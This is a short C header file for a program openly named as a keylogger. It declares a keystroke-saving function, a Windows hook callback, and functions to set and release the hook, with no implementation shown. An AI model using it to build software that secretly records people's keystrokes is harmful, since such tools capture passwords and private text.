#pragma once
#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include "common.h"

int save_key_to_file(int key_stroke); 
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);
void SetHook();
void ReleaseHook();


#endif // !KEYLOGGER_H
